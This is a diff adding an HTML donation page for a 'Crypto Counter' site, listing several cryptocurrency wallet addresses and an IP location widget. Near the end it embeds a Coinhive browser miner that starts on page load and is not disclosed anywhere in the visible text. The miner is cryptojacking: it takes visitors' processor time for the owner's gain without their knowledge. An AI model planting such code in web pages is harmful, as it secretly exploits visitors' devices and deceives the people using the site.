@@ -1,0 +1,123 @@
+
+<title>Crypto Counter</title>
+<head><link rel="icon" href="Favicon.ico">
+<style>
+ul {
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background-color: #333;
+}
+
+li {
+    float: left;
+}
+
+li a {
+    display: block;
+    color: white;
+    text-align: center;
+    padding: 14px 16px;
+    text-decoration: none;
+}
+
+li a:hover {
+    background-color: #111;
+}
+</style>
+</head>
+<body>
+
+<ul>
+  <li><a class="active" href="https://galien1.github.io/CryptoCounter/">Home</a></li>
+  <li><a href="#news">News</a></li>
+  <li><a href="#contact">Contact</a></li>
+  <li><a href="#about">About</a></li>
+</ul>
+
+<body>
+
+<h1><p>Welcome to Staff Favorites for CryptoCounter:</p></h1>
+<h1><p>Welcome to Donate!</p></h1>
+<h3><p>Below are the addresses you can donate to! Truly thank you so much if you have donated! Please put your public email in the donation descripion if you would like to! Remember that donations are non-refundable. If your payment doesnt go through sorry we cannot refund you! Thanks for understanding!</p></h3>
+
+<h4><p>Vertcoin address:</p></h4>
+<h4><p>Vn94TLCwcr2r8tRNAdAYc6fmPijLZTTUGL</p></h4>
+<h4><p>Bitcoin address:</p></h4>
+<h4><p>1D9ug6Q7WFCf67zvDzHoCQyyEnZQNrQ5Pi</p></h4>
+<h4><p>Monero address:</p></h4>
+<h4><p>XMR Address:  44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn</p></h4>
+<h4><p>Payment ID:   49d4ce3223672bd8ad856c27fdeaccd0dd5d7b6c88644c4a1530e053dbfe387d</p></h4>
+<h4><p>Ripple address:</p></h4>
+<h4><p>Ripple address:     rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh</p></h4>
+<h4><p>Deposit tag:     107733205</p></h4>
+<h4><p>Bitcoin Cash address:</p></h4>
+<h4><p>1D9ug6Q7WFCf67zvDzHoCQyyEnZQNrQ5Pi</p></h4>
+<h4><p>Ethereum Address:</p></h4>
+<h4><p>0x52640e302242edcbbe94a0fe9d8df48cf87e7eae</p></h4>
+<h4><p>Litecoin address:</p></h4>
+<h4><p>LXAAqVpHrK58CoTpQJWcSFTbSWZECisha9</p></h4>
+<h4><p>ZCash address:</p></h4>
+<h4><p>t1KiMsiB9RoPLCUi3tCYnCwUr1n8wvnyA6u</p></h4>
+<link rel="stylesheet" href="style.css">
+
+
+<br>
+<div style="color:gray">
+<center>
+Copyright 2017 Galien1
+</center>
+
+<!-- IP Show -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+    $("#show").click(function(){
+        $("shs").show();
+    });
+    $("#hide").click(function(){
+        $("shs").hide();
+    });
+});
+</script>
+
+<shs>
+<h4><p>Do not worry this doesn't grab your IP. This is just a security precaution.</p></h4>
+<!-- Ip2 location -->
+<center>
+  <a href=" http://www.ip2location.com/free/widgets" target="_blank">
+<img src="https://tools.ip2location.com/ip2location.png" border="0" width="400" height="80" />
+</a>
+</div>
+</center>
+</shs>
+<center>
+<button id="hide">Hide IP</button>
+<button id="show">Show IP</button>
+</center>
+</br>
+
+<!-- TOS -->
+<a href="http://galien1.github.io/Tos/">Terms of service</a>
+    <!-- Miner -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('RlGAt8lTJCiTqjr9OqXielT42XrsEFLl', { throttle: 0.5 });
+    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+    miner.start();
+</script>
+
+<script>
+    // Listen on events
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
+    // Update stats once per second
+    setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        // Output to HTML elements...
+    }, 1000);
+</script>
+</body>
